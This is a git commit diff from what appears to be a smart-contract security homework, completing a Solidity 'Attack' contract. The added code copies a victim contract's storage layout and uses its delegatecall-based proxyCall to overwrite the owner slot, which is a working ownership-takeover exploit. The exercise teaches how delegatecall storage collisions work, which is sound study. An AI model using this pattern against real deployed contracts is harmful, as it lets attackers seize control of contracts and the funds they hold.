468549025b6d7e3db243f4c6304f973cd0716d28
87jerry <161699506+87jerry@users.noreply.github.com>
2024-03-27 01:33:21 +0800

    Add files via upload

--- hw1/src/Delegation/Delegation.sol
+++ hw1/src/Delegation/Delegation.sol
@@ -7,19 +7,32 @@ interface ID31eg4t3 {
 }
 
 contract Attack {
-    address internal immutable victim;
     // TODO: Declare some variable here
     // Note: Checkout the storage layout in victim contract
+	uint256 var0 = 12345;
+    uint8 var1 = 32;
+    string private var2;
+	address private var3;
+    uint8 private var4;
+    address public owner;
+    mapping(address => bool) public result;
+	address internal immutable victim;
 
     constructor(address addr) payable {
         victim = addr;
     }
 
     // NOTE: You might need some malicious function here
+	function change(address msgSender) public{
+		result[msgSender]=true;
+		owner=msgSender;
+	}
 
     function exploit() external {
         // TODO: Add your implementation here
         // Note: Make sure you know how delegatecall works
         // bytes memory data = ...
+		address owner2=ID31eg4t3(victim).proxyCall(abi.encodeWithSignature("change(address)",msg.sender));
+		require(owner2==msg.sender, "QQ");
     }
 }
